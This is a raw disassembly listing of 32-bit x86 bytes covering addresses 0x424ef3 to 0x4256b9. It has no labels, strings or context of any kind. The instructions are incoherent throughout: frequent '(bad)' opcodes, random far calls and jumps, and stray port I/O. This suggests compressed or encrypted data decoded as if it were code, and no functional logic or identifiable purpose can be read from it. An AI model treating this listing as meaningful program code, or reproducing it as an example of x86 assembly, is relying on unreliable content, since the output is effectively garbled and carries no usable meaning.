  424ef3:	(bad)  [ebx-0x30a0aa0b]
  424ef9:	or     BYTE PTR [ecx-0x3ff8fded],al
  424eff:	xor    DWORD PTR [ebp+esi*2-0x13],0xffffffb2
  424f04:	and    eax,DWORD PTR [ebp-0x4]
  424f07:	fnstcw WORD PTR ds:0xc8bb1e27
  424f0d:	add    eax,0xd47777a4
  424f12:	stos   DWORD PTR es:[edi],eax
  424f13:	sub    eax,ebp
  424f15:	adc    ch,BYTE PTR [ecx+0x3b]
  424f18:	push   ebp
  424f19:	adc    BYTE PTR fs:[bx-0x5629],dl
  424f1f:	call   FWORD PTR [edi]
  424f21:	sahf   
  424f22:	sub    DWORD PTR [eax+0x7cb0e3d2],edi
  424f28:	sbb    edi,DWORD PTR [edi]
  424f2a:	push   ds
  424f2b:	scas   al,BYTE PTR es:[edi]
  424f2c:	push   0xffffff8d
  424f2e:	(bad)  
  424f2f:	call   0x4a9c:0xf369c1f7
  424f36:	inc    edi
  424f37:	aad    0x80
  424f39:	in     al,0x96
  424f3b:	dec    edi
  424f3c:	mov    ebp,0xa7ea9c78
  424f41:	jp     0x424f5e
  424f43:	imul   ebp,DWORD PTR [edi],0xffffffc5
  424f46:	dec    ebp
  424f47:	sahf   
  424f48:	mov    BYTE PTR ds:0xcb8f5bdd,al
  424f4e:	fadd   st(2),st
  424f50:	or     BYTE PTR [ebx+edx*4-0x3a9d27a],ch
  424f57:	daa    
  424f58:	dec    ebx
  424f59:	xlat   BYTE PTR ds:[ebx]
  424f5a:	jmp    0x424f92
  424f5c:	(bad)  
  424f5d:	mov    cl,0x74
  424f5f:	mov    esp,0x13450fd0
  424f64:	in     eax,dx
  424f65:	push   ebp
  424f66:	fnstcw WORD PTR [esi+0x4a]
  424f69:	cwde   
  424f6a:	or     eax,0x945e3cc3
  424f6f:	psrad  mm7,QWORD PTR [ebp+0x52]
  424f73:	and    ah,BYTE PTR ds:0xafd89166
  424f79:	imul   ebp,ebx,0x1f
  424f7c:	pop    ecx
  424f7d:	sbb    eax,0xd04f646c
  424f82:	pushf  
  424f83:	std    
  424f84:	aas    
  424f85:	inc    edi
  424f86:	xor    eax,0xdbe295a2
  424f8b:	std    
  424f8c:	adc    eax,0x45e83e76
  424f91:	inc    esp
  424f92:	pop    edx
  424f93:	xor    BYTE PTR [bx+di-0x2a],bl
  424f97:	hlt    
  424f98:	(bad)  
  424f99:	not    dl
  424f9b:	pop    esi
  424f9c:	jmp    0xa9e7:0xf070f971
  424fa3:	sahf   
  424fa4:	mov    edx,0xe14d03b2
  424fa9:	sahf   
  424faa:	sub    al,cl
  424fac:	pop    es
  424fad:	fsubp  st(1),st
  424faf:	xor    dh,bh
  424fb1:	mov    ebx,0xf62f044c
  424fb6:	adc    ah,BYTE PTR [edx-0x1c]
  424fb9:	ja     0x424fb8
  424fbb:	(bad)  
  424fbc:	aas    
  424fbd:	inc    eax
  424fbe:	dec    ebp
  424fbf:	ret    
  424fc0:	bound  di,DWORD PTR [esi]
  424fc3:	inc    ebx
  424fc4:	punpckhbw mm4,QWORD PTR [bx+di]
  424fc8:	and    BYTE PTR [ebx+0x43e16467],al
  424fce:	lahf   
  424fcf:	add    DWORD PTR [ebp-0x12a56234],0x15
  424fd6:	scas   eax,DWORD PTR es:[edi]
  424fd7:	xor    bh,0xec
  424fda:	xchg   esi,eax
  424fdb:	sub    edi,edx
  424fdd:	stos   DWORD PTR es:[edi],eax
  424fde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424fdf:	xor    BYTE PTR ss:[esi+eax*1-0x7f057bda],al
  424fe7:	mov    edi,0x8e9f4c69
  424fec:	cmp    DWORD PTR [edx+0x8],edi
  424fef:	jge    0x424f91
  424ff1:	in     al,0xbe
  424ff3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ff4:	jecxz  0x424fd3
  424ff6:	mov    ecx,0xab27489b
  424ffb:	mov    ebp,ebp
  424ffd:	push   edx
  424ffe:	inc    ebp
  424fff:	nop
  425000:	pop    esp
  425001:	aas    
  425002:	mov    eax,0x4dbf9ba0
  425007:	sub    ch,BYTE PTR [edx]
  425009:	xor    al,0x33
  42500b:	mov    ch,0xd6
  42500d:	shr    BYTE PTR [edi+0x1e],1
  425010:	daa    
  425011:	sbb    al,0xd3
  425013:	dec    edx
  425014:	into   
  425015:	pop    edi
  425016:	xchg   DWORD PTR [ebx+0x23],edx
  425019:	xchg   esp,eax
  42501a:	inc    esp
  42501b:	data16 stos BYTE PTR es:[edi],al
  42501d:	add    esi,DWORD PTR [eax]
  42501f:	jb     0x424fbd
  425021:	cwde   
  425022:	mov    bh,BYTE PTR [eax+0x763ba185]
  425028:	dec    esi
  425029:	test   eax,0xcea43bca
  42502e:	sub    DWORD PTR [ecx],ebx
  425030:	xchg   edi,edi
  425032:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425033:	pop    edi
  425034:	push   edi
  425035:	xchg   edi,eax
  425036:	and    eax,0x1e4c930
  42503b:	mov    dl,0xe3
  42503d:	pop    ebp
  42503e:	sahf   
  42503f:	lahf   
  425040:	(bad)  
  425042:	cwde   
  425043:	stos   BYTE PTR es:[edi],al
  425044:	icebp  
  425045:	loop   0x42508d
  425047:	int3   
  425048:	jg     0x424fe2
  42504a:	out    dx,eax
  42504b:	dec    edx
  42504c:	inc    esp
  42504d:	add    al,0x0
	...
  425057:	add    BYTE PTR [eax],al
  425059:	add    BYTE PTR [ebx-0x73],al
  42505c:	pop    ds
  42505d:	and    bh,bl
  42505f:	mov    dl,0x7f
  425061:	out    dx,eax
  425062:	leave  
  425063:	enter  0xb54,0x12
  425067:	cld    
  425068:	pop    eax
  425069:	call   0x1fc:0x1c87c
  425070:	add    BYTE PTR [eax],al
  425072:	fist   DWORD PTR [ebx+0x6e975f8b]
  425078:	hlt    
  425079:	mov    ebx,0x9ccc4ad4
  42507e:	jb     0x4250e2
  425080:	rcl    BYTE PTR [edx+ebx*8],1
  425083:	mov    ?,WORD PTR [ecx]
  425085:	xchg   DWORD PTR [edi-0x77],edi
  425088:	dec    edi
  425089:	ret    
  42508a:	add    DWORD PTR [esi],esp
  42508c:	mov    edi,0x39a55e70
  425091:	retf   
  425092:	retf   0xee1c
  425095:	push   0xffffff98
  425097:	mov    ch,0x11
  425099:	xor    eax,0x8e1dd961
  42509e:	mov    edi,0x34e56617
  4250a3:	mov    al,0xb
  4250a5:	scas   eax,DWORD PTR es:[edi]
  4250a6:	mov    bl,0xe
  4250a8:	mov    ch,0x4a
  4250aa:	lods   al,BYTE PTR ds:[esi]
  4250ab:	push   ds
  4250ac:	outs   dx,DWORD PTR ds:[esi]
  4250ad:	or     eax,0x11f2b9cc
  4250b2:	dec    esp
  4250b3:	inc    ebp
  4250b4:	in     al,0xac
  4250b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4250b7:	outs   dx,BYTE PTR ds:[esi]
  4250b8:	les    ebp,FWORD PTR [esi+ebx*8-0x1663f21f]
  4250bf:	mov    cl,0x1c
  4250c1:	in     eax,0x9
  4250c3:	adc    ch,BYTE PTR [edi-0x1a1f5659]
  4250c9:	jae    0x4250d0
  4250cb:	jno    0x42506d
  4250cd:	cdq    
  4250ce:	xchg   esp,eax
  4250cf:	pop    eax
  4250d0:	outs   dx,DWORD PTR ds:[esi]
  4250d1:	add    BYTE PTR [ecx+0x69],dl
  4250d4:	dec    eax
  4250d5:	neg    DWORD PTR [esi+0xe]
  4250d8:	sbb    al,BYTE PTR [ebp+0x8126e2a]
  4250de:	repnz cmp DWORD PTR [eax],0x505110ce
  4250e5:	sbb    al,0x2c
  4250e7:	sbb    ebp,esi
  4250e9:	mov    esi,0x130e33db
  4250ee:	(bad)  
  4250ef:	cmp    edx,DWORD PTR [eax+ebx*4]
  4250f2:	mov    ah,0x53
  4250f4:	pop    eax
  4250f5:	push   esp
  4250f6:	xchg   DWORD PTR [eax],ecx
  4250f8:	xor    eax,0x8f62b1ad
  4250fd:	test   eax,0x7f810d56
  425102:	cmp    edi,DWORD PTR [eax-0x41]
  425105:	jle    0x42513d
  425107:	mov    ebp,DWORD PTR [ecx-0x35]
  42510a:	int    0x55
  42510c:	les    eax,FWORD PTR [edi-0x40]
  42510f:	ins    DWORD PTR es:[edi],dx
  425110:	inc    esp
  425111:	enter  0x70dd,0x43
  425115:	dec    esp
  425116:	mov    edi,0xb748092c
  42511b:	sub    DWORD PTR [edx-0x3e12b847],ebx
  425121:	mov    bl,0x86
  425123:	arpl   di,bx
  425125:	rcl    ebp,1
  425127:	inc    ecx
  425128:	aaa    
  425129:	imul   esp,DWORD PTR [ebx],0xa567e67e
  42512f:	pop    esp
  425130:	push   0x50
  425132:	pop    ebp
  425133:	ds mov ebx,0xf7ba34e3
  425139:	and    DWORD PTR [edx+ebx*4],edi
  42513c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42513d:	cs inc edi
  42513f:	add    DWORD PTR [ebp+0x22],edx
  425142:	stos   DWORD PTR es:[edi],eax
  425143:	and    eax,0x9a0d6efd
  425148:	add    al,0x6c
  42514a:	outs   dx,BYTE PTR ds:[esi]
  42514b:	sbb    BYTE PTR [edi+0xc],0x13
  42514f:	(bad)  
  425150:	std    
  425151:	int3   
  425152:	mov    esp,0x8a584fd
  425157:	std    
  425158:	push   ebp
  425159:	sbb    DWORD PTR [edx+eiz*1],esp
  42515c:	gs test eax,0xc88b19eb
  425162:	pop    edx
  425163:	loope  0x4251ab
  425165:	ror    BYTE PTR [edi+0x7f],1
  425168:	mov    eax,ds:0x2f35523f
  42516d:	mov    bh,0x40
  42516f:	outs   dx,BYTE PTR ds:[esi]
  425170:	test   DWORD PTR [eax],0xfa91cb95
  425176:	dec    edx
  425177:	push   esi
  425178:	push   0x51
  42517a:	(bad)  [eax+0x40]
  42517d:	inc    ebx
  42517e:	mov    WORD PTR ds:[ebx-0x73226f17],cs
  425185:	jg     0x4251ab
  425187:	pop    eax
  425188:	sar    DWORD PTR [ecx+esi*2-0x72],cl
  42518c:	icebp  
  42518d:	push   cs
  42518e:	iret   
  42518f:	cmp    BYTE PTR [ecx+esi*8],0x5
  425193:	mov    esi,0x3b999f66
  425198:	add    ch,ch
  42519a:	mov    ebx,0x7593b500
  42519f:	sbb    ah,ah
  4251a1:	jecxz  0x42512b
  4251a3:	fcomip st,st(4)
  4251a5:	inc    ebp
  4251a6:	imul   ecx,DWORD PTR [edi+0xc],0xfa971a52
  4251ad:	jecxz  0x425182
  4251af:	xchg   esp,eax
  4251b0:	xchg   esi,eax
  4251b1:	xchg   esp,eax
  4251b2:	dec    edi
  4251b3:	mov    al,ds:0x22091d31
  4251b8:	dec    esp
  4251b9:	add    BYTE PTR [edi-0x39],al
  4251bc:	test   ch,dh
  4251be:	xchg   edx,eax
  4251bf:	jno    0x425199
  4251c1:	pop    edx
  4251c2:	les    ebp,FWORD PTR [esi-0x2f0c79be]
  4251c8:	lea    ebp,[eax-0x5d]
  4251cb:	mov    eax,0xbac9eafd
  4251d0:	out    0x86,al
  4251d2:	add    eax,ebx
  4251d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4251d5:	cmp    eax,DWORD PTR [edi]
  4251d7:	add    cl,bl
  4251d9:	jg     0x4251ba
  4251db:	pop    edi
  4251dc:	shr    BYTE PTR [esi+0x74e35028],1
  4251e2:	cmp    BYTE PTR [ecx],bh
  4251e4:	pop    ebp
  4251e5:	cwde   
  4251e6:	scas   al,BYTE PTR es:[edi]
  4251e7:	xchg   edi,eax
  4251e8:	adc    eax,0x4795d11a
  4251ed:	dec    esi
  4251ee:	jle    0x4251c0
  4251f0:	adc    ah,BYTE PTR [edx+0x14]
  4251f3:	pop    ebx
  4251f4:	or     al,0xe2
  4251f6:	mov    eax,0xaf4726a8
  4251fb:	mov    ah,0x27
  4251fd:	cdq    
  4251fe:	lahf   
  4251ff:	fdiv   st(4),st
  425201:	aam    0x6d
  425203:	cld    
  425204:	dec    ebp
  425205:	mov    bl,0x29
  425207:	pop    ecx
  425208:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425209:	test   DWORD PTR [edx+0x67],esi
  42520c:	inc    edi
  42520d:	xchg   ecx,eax
  42520e:	in     al,dx
  42520f:	push   es
  425210:	jmp    0x425240
  425212:	mov    edi,0xd44a9256
  425217:	pop    eax
  425218:	dec    ecx
  425219:	mov    ah,0x1
  42521b:	push   cs
  42521c:	mov    ebx,0x15ca4eb2
  425221:	jb     0x4251db
  425223:	je     0x4251fc
  425225:	xchg   ecx,eax
  425226:	jp     0x425293
  425228:	in     al,0x9e
  42522a:	add    DWORD PTR [edi+ebp*4],eax
  42522d:	pop    edx
  42522e:	(bad)  
  42522f:	arpl   WORD PTR [ebx],di
  425231:	adc    BYTE PTR [edx+0x79a3c5a7],0x79
  425238:	jp     0x4251ed
  42523a:	pop    ecx
  42523b:	xchg   ebp,eax
  42523c:	addr16 push 0xb17f9f39
  425242:	mov    esp,esp
  425244:	shl    dl,cl
  425246:	das    
  425247:	je     0x4252b0
  425249:	cli    
  42524a:	add    eax,0x830b8ea4
  42524f:	dec    esp
  425250:	daa    
  425251:	aad    0x60
  425253:	mov    bl,0xb3
  425255:	scas   eax,DWORD PTR es:[edi]
  425256:	repz sub DWORD PTR [esi+0x292c9239],esi
  42525d:	dec    edx
  42525e:	stos   DWORD PTR es:[edi],eax
  42525f:	xchg   esi,eax
  425260:	jmp    FWORD PTR [ebx+0x2ebfe12c]
  425266:	or     DWORD PTR [ebp-0x74],esi
  425269:	test   al,0x49
  42526b:	push   cs
  42526c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42526d:	pushf  
	...
  42527a:	hlt    
  42527b:	cmp    DWORD PTR [edx-0x2002081],edx
  425281:	mov    ebx,0xd77f6470
  425286:	xlat   BYTE PTR ds:[ebx]
  425287:	and    eax,0xca78d2e6
  42528c:	add    DWORD PTR [eax],eax
  42528e:	cld    
  42528f:	add    DWORD PTR [eax],eax
  425291:	add    dl,ah
  425293:	ror    DWORD PTR [edx-0x3fd03888],cl
  425299:	inc    edx
  42529a:	mov    bl,0xd2
  42529c:	iret   
  42529d:	rol    BYTE PTR [ecx+ebp*4+0xb6215b1],0x49
  4252a5:	mov    edx,0x3fff6b5d
  4252aa:	sbb    dh,dl
  4252ac:	xor    al,0x46
  4252ae:	in     al,dx
  4252af:	jl     0x425245
  4252b1:	jno    0x425274
  4252b3:	mov    ah,0x2d
  4252b5:	and    al,0x2
  4252b7:	mov    ds:0xe843971a,eax
  4252bc:	sbb    DWORD PTR [ecx],ecx
  4252be:	ss jb  0x4252eb
  4252c1:	out    0xb,eax
  4252c3:	in     eax,0x71
  4252c5:	sub    eax,0x9548ab1f
  4252ca:	retf   0x1f98
  4252cd:	(bad)  
  4252cf:	dec    eax
  4252d0:	mov    dl,0x15
  4252d2:	mov    BYTE PTR [esi],bl
  4252d4:	mov    ds:0x43ee8d31,al
  4252d9:	int    0x77
  4252db:	jle    0x425349
  4252dd:	lock imul edi,DWORD PTR [esi-0x3a],0xffffff80
  4252e2:	xor    al,0x9d
  4252e4:	inc    ecx
  4252e5:	pop    ebp
  4252e6:	lock mov WORD PTR [ecx+0x6bfa6f90],?
  4252ed:	test   DWORD PTR [ecx+0x1a],edx
  4252f0:	bound  esi,QWORD PTR [ecx+edi*2]
  4252f3:	jecxz  0x425373
  4252f5:	sub    DWORD PTR [edx-0xe4dcb89],edi
  4252fb:	stos   DWORD PTR es:[edi],eax
  4252fc:	dec    ecx
  4252fd:	out    dx,eax
  4252fe:	sti    
  4252ff:	jmp    0x425304
  425301:	pop    es
  425302:	inc    ebx
  425303:	fcmovb st,st(4)
  425305:	(bad)  
  425306:	fimul  WORD PTR [edi+0x1e1f702c]
  42530c:	in     al,0xb9
  42530e:	fild   WORD PTR [eax]
  425310:	jp     0x425379
  425312:	xchg   esi,eax
  425313:	adc    esp,DWORD PTR [ecx+0x35d081dd]
  425319:	push   es
  42531a:	sbb    cl,al
  42531c:	inc    ecx
  42531d:	test   al,0xa
  42531f:	sub    eax,0x82bca30c
  425324:	int3   
  425325:	add    DWORD PTR [eax-0x271e7cab],eax
  42532b:	in     al,0xbf
  42532d:	jp     0x4252ff
  42532f:	dec    ebp
  425330:	out    dx,eax
  425331:	clc    
  425332:	and    edi,DWORD PTR [edx+0x6e]
  425335:	fwait
  425336:	lahf   
  425337:	fwait
  425338:	inc    ebx
  425339:	clc    
  42533a:	inc    ebx
  42533b:	mov    ds:0x3d4a86bb,eax
  425340:	mov    ebx,0xa850817d
  425345:	inc    edi
  425346:	push   ebx
  425347:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425348:	jb     0x4253b3
  42534a:	stos   DWORD PTR es:[edi],eax
  42534b:	sub    al,0xe5
  42534d:	repz mov esi,0xb8fb9aa7
  425353:	imul   ebp,DWORD PTR [esi+0xd6f4078],0xffffffb7
  42535a:	or     BYTE PTR [ebx],ch
  42535c:	sbb    al,0xb1
  42535e:	cmp    al,BYTE PTR [eax]
  425360:	sbb    al,0x18
  425362:	jp     0x42537c
  425364:	push   ebp
  425365:	sbb    ebx,ebx
  425367:	xor    BYTE PTR [edx+0x6f],cl
  42536a:	mov    edi,0x95a381e7
  42536f:	stos   BYTE PTR es:[edi],al
  425370:	std    
  425371:	outs   dx,DWORD PTR ds:[esi]
  425372:	cli    
  425373:	xlat   BYTE PTR ds:[ebx]
  425374:	mov    eax,DWORD PTR [esi]
  425376:	in     eax,dx
  425377:	push   esp
  425378:	inc    ebx
  425379:	sub    ebx,DWORD PTR [edi]
  42537b:	rcr    esp,cl
  42537d:	and    DWORD PTR [esi+0x71199f27],eax
  425383:	mov    dl,0xc2
  425385:	mov    ds:0xd64812be,eax
  42538a:	adc    al,0x57
  42538c:	sub    DWORD PTR [ecx+0x31],esp
  42538f:	jmp    0x4253e2
  425391:	sete   BYTE PTR [ebx-0x21]
  425395:	push   esi
  425396:	fwait
  425397:	iret   
  425398:	jecxz  0x4253b3
  42539a:	push   cs
  42539b:	sbb    ch,BYTE PTR [esi+0x3e]
  42539e:	pushf  
  42539f:	(bad)  [ebp+0xb]
  4253a2:	push   eax
  4253a3:	mov    eax,0x94a226dc
  4253a8:	cmp    esp,esi
  4253aa:	mov    ah,0x4f
  4253ac:	aaa    
  4253ad:	pop    edx
  4253ae:	and    BYTE PTR ds:0x6517d57e,dl
  4253b4:	ins    DWORD PTR es:[edi],dx
  4253b5:	adc    BYTE PTR [eax+ebx*2-0x10],0xfc
  4253ba:	bound  edx,QWORD PTR [eax-0x76cb4228]
  4253c0:	pop    esp
  4253c1:	dec    ebx
  4253c2:	je     0x425387
  4253c4:	jnp    0x4253d9
  4253c6:	cmp    dl,ch
  4253c8:	outs   dx,BYTE PTR ds:[esi]
  4253c9:	sub    ecx,DWORD PTR [edi-0x6718fcd1]
  4253cf:	xor    esp,ebx
  4253d1:	das    
  4253d2:	push   cs
  4253d3:	repz fst DWORD PTR [edx+0xf2c9dc2]
  4253da:	push   ecx
  4253db:	xor    cx,WORD PTR [ebp+0x4e]
  4253df:	cmp    ah,bl
  4253e1:	fwait
  4253e2:	mov    ah,0x8
  4253e4:	xchg   ax,ax
  4253e6:	int3   
  4253e7:	sub    BYTE PTR [ecx+0x7fd2db1f],ah
  4253ed:	mov    ecx,0x89eea840
  4253f2:	scas   eax,DWORD PTR es:[edi]
  4253f3:	test   al,0x89
  4253f5:	fs sbb eax,0xae49aaaa
  4253fb:	xchg   edx,eax
  4253fc:	adc    eax,0x74603c53
  425401:	jg     0x4253ce
  425403:	sub    esp,DWORD PTR [ebx-0x32b12168]
  425409:	repz pop edx
  42540b:	neg    DWORD PTR ss:[ebp-0x43ee6a09]
  425412:	sar    BYTE PTR [edx-0x4b],1
  425415:	les    ebx,FWORD PTR [edx+edx*2+0x2527efbf]
  42541c:	(bad)  
  42541d:	test   al,0x24
  425420:	cmp    edx,DWORD PTR [ebp-0x58]
  425423:	arpl   WORD PTR [eax+0x78afef38],si
  425429:	or     eax,DWORD PTR [edx-0x1]
  42542c:	xchg   bh,al
  42542e:	push   ebp
  42542f:	mov    edx,edx
  425431:	lds    ebp,FWORD PTR [esi-0x80]
  425434:	jmp    0x4254a2
  425436:	jp     0x42544c
  425438:	mov    al,0x59
  42543a:	add    al,0xf8
  42543c:	rcr    DWORD PTR [ebp-0x46],1
  42543f:	cdq    
  425440:	(bad)  
  425442:	push   ds
  425443:	lods   eax,DWORD PTR ds:[esi]
  425444:	repnz mov DWORD PTR [eax+ebx*2+0xeccf2aa],ebx
  42544c:	xchg   ebx,eax
  42544d:	sbb    esi,DWORD PTR [edx]
  42544f:	cmp    bl,bh
  425451:	xchg   esp,eax
  425452:	pop    esi
  425453:	stos   DWORD PTR es:[edi],eax
  425454:	stos   DWORD PTR es:[edi],eax
  425455:	inc    ecx
  425456:	jne    0x4254b2
  425458:	fnstsw WORD PTR ds:0x3b425aeb
  42545e:	cmp    eax,0xf3fb41f7
  425463:	sbb    bh,BYTE PTR [ebp-0xbfc5425]
  425469:	push   esi
  42546a:	dec    eax
  42546b:	loopne 0x42544b
  42546d:	dec    ecx
  42546e:	cmp    ah,dl
  425470:	or     eax,0x90bcef4f
  425475:	mov    BYTE PTR [eax-0x38667276],dl
  42547b:	and    eax,0x928db7b5
  425480:	out    dx,eax
  425481:	and    eax,ebx
  425483:	pop    ss
  425484:	dec    edi
  425485:	ret    
  425486:	jl     0x4254af
  425488:	lock dec edx
  42548a:	xor    esp,DWORD PTR [ebx+0x1c6f]
	...
  425498:	add    BYTE PTR [eax],al
  42549a:	push   esp
  42549b:	ds and al,0x19
  42549e:	outs   dx,BYTE PTR ds:[esi]
  42549f:	sbb    edi,DWORD PTR [ebp+0x7f]
  4254a2:	(bad)  
  4254a3:	aam    0x10
  4254a5:	dec    edi
  4254a6:	mov    esp,DWORD PTR [eax-0x338bcb78]
  4254ac:	add    DWORD PTR [eax],eax
  4254ae:	cld    
  4254af:	add    DWORD PTR [eax],eax
  4254b1:	add    BYTE PTR [ebp+ebp*1-0x2a],ah
  4254b5:	dec    esi
  4254b6:	push   esi
  4254b7:	cmp    BYTE PTR [edx],bh
  4254b9:	and    DWORD PTR [edi],ebp
  4254bb:	ficom  WORD PTR [ecx]
  4254bd:	cmp    esp,DWORD PTR [ebx+0x47d8a45f]
  4254c3:	outs   dx,DWORD PTR ds:[esi]
  4254c4:	adc    eax,0x3e45e46b
  4254c9:	retf   0x25db
  4254cc:	inc    DWORD PTR [ecx+0x3d8af19f]
  4254d2:	and    bh,BYTE PTR [esi+0x4c83e2ae]
  4254d8:	mov    fs,esi
  4254da:	dec    edi
  4254db:	mov    bh,0x69
  4254dd:	sbb    eax,0xa234d976
  4254e2:	adc    DWORD PTR [edi+ebx*4],ebx
  4254e5:	(bad)  
  4254e6:	stos   BYTE PTR es:[edi],al
  4254e7:	jl     0x425516
  4254e9:	in     al,0xe2
  4254eb:	stos   BYTE PTR es:[edi],al
  4254ec:	mov    ah,0xc9
  4254ee:	sbb    ebx,DWORD PTR [edi]
  4254f0:	ja     0x4254e1
  4254f2:	inc    edi
  4254f3:	nop
  4254f4:	int3   
  4254f5:	ficomp DWORD PTR [edi+ebx*8]
  4254f8:	(bad)  
  4254f9:	aas    
  4254fa:	fs dec edx
  4254fc:	mov    ebx,0xd790c506
  425501:	(bad)  
  425502:	dec    ecx
  425503:	xchg   esi,eax
  425504:	repnz aaa 
  425506:	test   DWORD PTR [edx-0xf6184cf],edi
  42550c:	or     dh,BYTE PTR ds:0x292a466b
  425512:	(bad)  
  425513:	popa   
  425514:	dec    ebp
  425515:	in     al,0x11
  425517:	push   esp
  425518:	pop    ecx
  425519:	pushf  
  42551a:	push   esi
  42551b:	ds loope 0x425508
  42551e:	and    al,0xc3
  425520:	dec    ebp
  425521:	push   ebp
  425522:	pop    edx
  425523:	dec    eax
  425524:	push   ds
  425525:	mov    ?,WORD PTR [eax]
  425527:	imul   edi,ecx,0x5d
  42552a:	jae    0x4254fa
  42552c:	inc    ebp
  42552d:	sub    al,0x5
  42552f:	inc    edx
  425530:	xchg   esp,eax
  425531:	sub    eax,0xd68ba224
  425536:	outs   dx,BYTE PTR ds:[esi]
  425537:	outs   dx,BYTE PTR ds:[esi]
  425538:	push   edx
  425539:	push   ecx
  42553a:	cmp    esi,DWORD PTR [ebx+0x35]
  42553d:	or     al,0xe7
  42553f:	xor    bl,cl
  425541:	arpl   WORD PTR [eax+0x319395a7],bx
  425547:	jae    0x42554a
  425549:	jmp    0x4c85:0xdbf61389
  425550:	xchg   esp,eax
  425551:	push   ecx
  425552:	sbb    eax,0x32780bea
  425557:	push   esp
  425558:	popf   
  425559:	mov    ah,0x9c
  42555b:	gs dec ecx
  42555d:	(bad)  
  42555e:	aad    0xd3
  425560:	stos   DWORD PTR es:[edi],eax
  425561:	mov    dh,0x10
  425563:	clc    
  425564:	outs   dx,DWORD PTR ds:[esi]
  425565:	loopne 0x425506
  425567:	adc    BYTE PTR [eax-0x2dea8365],0x26
  42556e:	retf   0xa9d0
  425571:	pop    esp
  425572:	imul   eax,DWORD PTR [ebp-0x39],0x38
  425576:	xor    DWORD PTR [ecx],0xaa6a11f
  42557c:	add    eax,0xeadd7
  425581:	mov    cl,0xe3
  425583:	jmp    0xd673d020
  425588:	cdq    
  425589:	imul   esi,DWORD PTR [esi],0xffffffaa
  42558c:	int    0xa7
  42558e:	aaa    
  42558f:	ror    DWORD PTR [eax+ebp*4+0x74913e87],1
  425596:	leave  
  425597:	test   DWORD PTR [eax+0x3770e976],esi
  42559d:	dec    edi
  42559e:	ret    
  42559f:	xchg   ebp,eax
  4255a0:	jae    0x4255dd
  4255a2:	fadd   st,st(3)
  4255a4:	and    al,0xa0
  4255a6:	sbb    BYTE PTR [ebp+ebp*2+0x68cde434],bh
  4255ad:	xor    al,0x15
  4255af:	ins    DWORD PTR es:[edi],dx
  4255b0:	pcmpgtd mm2,QWORD PTR [esi+0x6b]
  4255b4:	shl    ah,1
  4255b6:	fist   DWORD PTR [esi]
  4255b8:	jnp    0x4255dd
  4255ba:	mov    ebx,0xdff08f1d
  4255bf:	push   es
  4255c0:	push   edx
  4255c1:	inc    ebp
  4255c2:	inc    DWORD PTR [edi-0x699fd3dd]
  4255c8:	mov    al,ds:0x11c64726
  4255cd:	xchg   ebx,eax
  4255ce:	pop    esp
  4255cf:	mov    ecx,0xeb36f01d
  4255d4:	sbb    bl,BYTE PTR [esi+0x16]
  4255d7:	es dec esp
  4255d9:	jge    0x4255d2
  4255db:	lea    edi,[edi+0x5a]
  4255de:	jl     0x42563a
  4255e0:	cs out dx,eax
  4255e2:	cmp    al,0xb6
  4255e4:	mov    eax,0xabd5c7d1
  4255e9:	outs   dx,BYTE PTR ds:[esi]
  4255ea:	not    DWORD PTR [esi+ebp*2]
  4255ed:	call   0xef35:0x4e72575a
  4255f4:	mov    ds:0xc4a3298e,eax
  4255f9:	pop    edi
  4255fa:	mov    dl,0xc8
  4255fc:	mov    cl,0xb3
  4255fe:	mov    gs,WORD PTR [edx]
  425600:	adc    eax,0xc63a7e08
  425605:	xchg   BYTE PTR [eax+ecx*4+0x51ebca63],cl
  42560c:	or     edi,eax
  42560e:	jg     0x4255ce
  425610:	gs mov ecx,0x7f3128b9
  425616:	loop   0x4255f6
  425618:	xor    bh,BYTE PTR [esi-0x2b]
  42561b:	adc    al,0x46
  42561d:	jg     0x42566d
  42561f:	ret    
  425620:	adc    eax,0xd1f0c29c
  425625:	inc    ebx
  425626:	mov    dl,0xcb
  425628:	or     al,0xb
  42562a:	jmp    0x4255ff
  42562c:	in     eax,0x7d
  42562e:	jp     0x42565d
  425630:	mov    dh,0x2f
  425632:	ja     0x42560b
  425634:	scas   eax,DWORD PTR es:[edi]
  425635:	sbb    dl,BYTE PTR ds:0x27e17b3c
  42563b:	lods   al,BYTE PTR ds:[esi]
  42563c:	push   0x60
  42563e:	dec    ebx
  42563f:	inc    ebx
  425640:	adc    DWORD PTR [ebp+0x49d5d09a],edi
  425646:	mov    ah,BYTE PTR [ebx-0x19]
  425649:	xlat   BYTE PTR ds:[ebx]
  42564a:	out    0xde,al
  42564c:	push   esi
  42564d:	adc    al,0x7b
  42564f:	lock inc esi
  425651:	xchg   ebx,eax
  425652:	push   esp
  425653:	int    0x90
  425655:	clc    
  425656:	xchg   esi,eax
  425657:	mov    dh,0xf2
  425659:	add    al,0xe7
  42565b:	hlt    
  42565c:	js     0x42566a
  42565e:	(bad)  
  42565f:	retf   0xdfbc
  425662:	loopne 0x42562f
  425664:	pop    es
  425665:	adc    edi,DWORD PTR ds:0x107e2973
  42566b:	jmp    0x1a09de2f
  425670:	fldcw  WORD PTR [ecx+eiz*4]
  425673:	inc    ebp
  425674:	inc    ebp
  425675:	inc    edi
  425676:	aaa    
  425677:	sub    BYTE PTR [edx-0x3c320b93],0xaa
  42567e:	jno    0x42568c
  425680:	dec    esi
  425681:	es ja  0x425628
  425684:	leave  
  425685:	mov    edx,0x214386d4
  42568a:	out    0x60,eax
  42568c:	fstp   TBYTE PTR [ebp+0x4e]
  42568f:	push   cs
  425690:	xchg   ebp,eax
  425691:	inc    esp
  425692:	xchg   ebx,eax
  425693:	mov    BYTE PTR [ebp+ebx*4+0xa2eaea5],cl
  42569a:	pop    es
  42569b:	fwait
  42569c:	in     eax,dx
  42569d:	cmp    eax,0xc3d69e4c
  4256a2:	test   BYTE PTR [edx-0x7e8622b3],ah
  4256a8:	loop   0x4256c0
  4256aa:	add    DWORD PTR [esi],ebx
  4256ac:	arpl   WORD PTR [ecx+0x0],sp
	...
  4256b7:	add    BYTE PTR [eax],al
  4256b9:	add    BYTE PTR [esi+0x74ef74ea],bh
